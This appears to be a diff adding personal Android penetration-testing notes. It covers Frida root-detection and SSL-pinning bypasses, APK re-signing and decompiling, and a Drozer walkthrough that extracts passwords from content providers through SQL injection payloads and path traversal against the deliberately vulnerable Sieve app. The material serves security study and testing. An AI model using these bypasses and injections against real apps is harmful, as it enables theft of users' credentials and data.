@@ -1,0 +1,168 @@
+frida root detection bypass
+frida --codeshare dzoUnerzy/fridantiroot -f YOUR_BINARY
+
+frida ssl pinning bypass
+frida --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida -f YOUR_BINARY
+
+ssl and root detection bypass
+frida -U -f [APP_ID] -l cutom.js --no-pause
+
+http://bit.ly/2Rg5MvU
+
+---self signed apk---
+
+    Rename the .apk file to .zip
+    Unpack the .zip file and remove the META-INF folder
+    Zip the folder again and rename it to .apk
+    Sign the apk:
+
+keytool -genkey -V -keystore /root/Desktop/key.keystore -alias c0ckr04ch -keyalg RSA -keysize 2048 -validity 1000
+
+keytool -importkeystore -srckeystore /root/Desktop/key.keystore -destkeystore /root/Desktop/key.keystore -deststoretype pkcs12
+
+jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/Desktop/key.keystore iConnect_UAT_1AUG.apk c0ckr04ch
+
+zipalign -v 4 iConnect_UAT_1AUG.apk signed.apk
+
+
+---root device---
+/appuse/.emulator/rooting/root.sh
+
+---JD-GUI---
+rename apk into zip
+copy classes.dex file into the dex2jar directory
+run >>> d2j-dex2jar classes.dex
+jdgui <jar file>
+
+---sublime text editor---
+awthe llh <file>
+
+---check certificate---
+openssl pkcs7 -inform DER -in CERT.RSA -noout -print_certs -text
+
+---show logs---
+adb shell ps | grep "packageName"
+adb logcat | grep processID
+
+--drozer---
+adb forward tcp:31415 tcp:31415
+drozer console connect
+
+Dynamic AnalysisNj
+Testing Content Providers
+To dynamically analyze an application's content and providers, first enumerate the attack surface: pass the app's package name to the Drozer module app.provider.info: to read 
+
+dz> run app.provider.info -a com.mwr.example.sieve
+  Package: com.mwr.example.sieve
+  Authority: com.mwr.example.sieve.DBContentProvider
+  Read Permission: null
+  Write Permission: null
+  Content Provider: com.mwr.example.sieve.DBContentProvider
+  Multiprocess Allowed: True
+  Grant Uri Permissions: False
+  Path Permissions:
+  Path: /Keys
+  Type: PATTERN_LITERAL
+  Read Permission: com.mwr.example.sieve.READ_KEYS
+  Write Permission: com.mwr.example.sieve.WRITE_KEYS
+  Authority: com.mwr.example.sieve.FileBackupProvider
+  Read Permission: null
+  Write Permission: null
+  Content Provider: com.mwr.example.sieve.FileBackupProvider
+  Multiprocess Allowed: True
+  Grant Uri Permissions: False
+In this example, two content providers are exported. Both can be accessed without permission, except for the /Keys path in the DBContentProvider. With this information, you can reconstruct part of the content URIs to access the DBContentProvider (the URIs begin with content://).
+
+To identify content provider URIs within the application, use Drozer's scanner.provider.finduris module. This module guesses paths and determines accessible content URIs in several ways:
+
+dz> run scanner.provider.finduris -a com.mwr.example.sieve
+Scanning com.mwr.example.sieve...
+Unable to Query content://com.mwr.example.sieve.DBContentProvider/
+...
+Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
+Accessible content URIs:
+content://com.mwr.example.sieve.DBContentProvider/Keys/
+content://com.mwr.example.sieve.DBContentProvider/Passwords
+content://com.mwr.example.sieve.DBContentProvider/Passwords/
+Once you have a list of accessible content providers, try to extract data from each provider with the app.provider.query module:
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
+_id: 1
+service: Email
+username: incognitoguy50
+password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)
+email: incognitoguy50@gmail.com
+You can also use Drozer to insert, update, and delete records from a vulnerable content provider:
+
+Insert record
+dz> run app.provider.insert content://com.vulnerable.im/messages
+                --string date 1331763850325
+                --string type 0
+                --integer _id 7
+Update record
+dz> run app.provider.update content://settings/secure
+                --selection "name=?"
+                --selection-args assisted_gps_enabled
+                --integer value 0
+Delete record
+dz> run app.provider.delete content://settings/secure
+                --selection "name=?"
+                --selection-args my_setting
+SQL Injection in Content Providers
+The Android platform promotes SQLite databases for storing user data. Because these databases are based on SQL, they may be vulnerable to SQL injection. You can use the Drozer module app.provider.query to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
+unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
+unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
+If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module app.provider.query is used to list all the database tables:
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
+FROM SQLITE_MASTER WHERE type='table';--"
+| type  | name             | tbl_name         | rootpage | sql              |
+| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
+| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
+| table | Key              | Key              | 5        | CREATE TABLE ... |
+SQL Injection may also be used to retrieve data from otherwise protected tables:
+
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
+| Password | pin |
+| thisismypassword | 9876 |
+You can automate these steps with the scanner.provider.injection module, which automatically finds vulnerable content providers within an app:
+
+dz> run scanner.provider.injection -a com.mwr.example.sieve
+Scanning com.mwr.example.sieve...
+Injection in Projection:
+  content://com.mwr.example.sieve.DBContentProvider/Keys/
+  content://com.mwr.example.sieve.DBContentProvider/Passwords
+  content://com.mwr.example.sieve.DBContentProvider/Passwords/
+Injection in Selection:
+  content://com.mwr.example.sieve.DBContentProvider/Keys/
+  content://com.mwr.example.sieve.DBContentProvider/Passwords
+  content://com.mwr.example.sieve.DBContentProvider/Passwords/
+File System Based Content Providers
+Content providers can provide access to the underlying filesystem. This allows apps to share files (the Android sandbox normally prevents this). You can use the Drozer modules app.provider.read and app.provider.download to read and download files, respectively, from exported file-based content providers. These content providers are susceptible to directory traversal, which allows otherwise protected files in the target application's sandbox to be read.
+
+dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
+Written 24488 bytes
+Use the scanner.provider.traversal module to automate the process of finding content providers that are susceptible to directory traversal:
+
+dz> run scanner.provider.traversal -a com.mwr.example.sieve
+Scanning com.mwr.example.sieve...
+Vulnerable Providers:
+  content://com.mwr.example.sieve.FileBackupProvider/
+  content://com.mwr.example.sieve.FileBackupProvider
+Note that adb can also be used to query content providers:
+
+$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
+Row: 0 id=1, username=admin, password=StrongPwd
+Row: 1 id=2, username=test, password=test
+...
+
+
+https://koz.io/using-frida-on-android-without-root/
+
+https://qualibrate.com/blog/quality-assurance/implement-mobsf-on-kali-linux/
+
+==========_end_of_note_==========
